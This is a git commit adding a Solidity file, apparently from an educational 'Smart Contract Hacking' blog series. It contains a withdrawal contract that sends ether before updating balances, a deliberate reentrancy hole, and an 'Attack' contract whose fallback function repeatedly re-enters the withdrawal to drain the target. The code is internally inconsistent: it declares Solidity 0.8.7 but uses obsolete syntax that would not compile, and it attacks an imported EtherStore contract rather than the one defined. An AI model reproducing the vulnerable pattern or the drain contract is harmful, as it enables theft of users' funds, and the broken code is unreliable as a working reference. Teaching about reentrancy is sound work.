bc2b173aa5cd9418d32fbd51dc68e2051fba52af
Stefan Lehmann <85541624+Stefan1612@users.noreply.github.com>
2022-04-26 21:54:00 +0200

    Update and rename Blog-2- to Blog-2-Reentrancy.sol

---
+++ Smart Contract Hacking/Blog-2-Reentrancy.sol
@@ -0,0 +1,58 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.7;
+
+// First Contract (The naive contract) 
+contract NaiveContract {
+
+    uint256 public withdrawalLimit = 1 ether;
+    mapping(address => uint256) public lastWithdrawTime;
+    mapping(address => uint256) public balances;
+
+    function depositFunds() public payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdrawFunds (uint256 _weiToWithdraw) public {
+        require(balances[msg.sender] >= _weiToWithdraw);
+        // limit the withdrawal
+        require(_weiToWithdraw <= withdrawalLimit);
+        // limit the time allowed to withdraw
+        require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
+        require(msg.sender.call.value(_weiToWithdraw)());
+        balances[msg.sender] -= _weiToWithdraw;
+        lastWithdrawTime[msg.sender] = now;
+    }
+ }
+ 
+// Second Contract (The malicious contract)
+
+import "EtherStore.sol";
+
+contract Attack {
+  EtherStore public etherStore;
+
+  // initialise the etherStore variable with the contract address
+  constructor(address _etherStoreAddress) {
+      etherStore = EtherStore(_etherStoreAddress);
+  }
+
+  function pwnEtherStore() public payable {
+      // attack to the nearest ether
+      require(msg.value >= 1 ether);
+      // send eth to the depositFunds() function
+      etherStore.depositFunds.value(1 ether)();
+      // start the magic
+      etherStore.withdrawFunds(1 ether);
+  }
+
+  function collectEther() public {
+      msg.sender.transfer(this.balance);
+  }
+
+  // fallback function - where the magic happens
+  function () payable {
+      if (etherStore.balance > 1 ether) {
+          etherStore.withdrawFunds(1 ether);
+      }
+  }
+}
